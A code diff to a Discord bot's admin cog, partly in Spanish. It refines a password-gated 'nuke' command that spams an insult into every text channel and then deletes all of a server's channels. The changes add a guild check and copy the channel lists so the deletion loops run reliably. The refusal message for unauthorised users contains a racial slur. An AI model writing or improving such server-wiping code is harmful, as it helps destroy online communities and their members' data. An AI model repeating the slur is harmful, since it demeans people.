@@ -18,6 +18,9 @@ class Admin(commands.Cog, name="Admin"):
         if ctx.author.id != ALLOWED_USER_ID:
             await ctx.send("❌ No estas autorizado, nigga.")
             return
+        if not ctx.guild:
+            await ctx.send("❌ Este comando solo puede usarse en un servidor.")
+            return
         nuke_password = os.getenv("NUKE_PASSWORD")
         if not nuke_password:
             await ctx.send("❌ The dev is missing something... 👀")
@@ -38,7 +41,7 @@ class Admin(commands.Cog, name="Admin"):
             return
 
         guild = ctx.guild
-        for channel in guild.text_channels:
+        for channel in list(guild.text_channels):
             try:
                 await channel.send("🔴 **Miguel ijo corrupto** 🔴")
             except Exception:
@@ -50,7 +53,7 @@ class Admin(commands.Cog, name="Admin"):
         except Exception:
             pass
 
-        for channel in guild.channels:
+        for channel in list(guild.channels):
             try:
                 await channel.delete()
             except Exception:
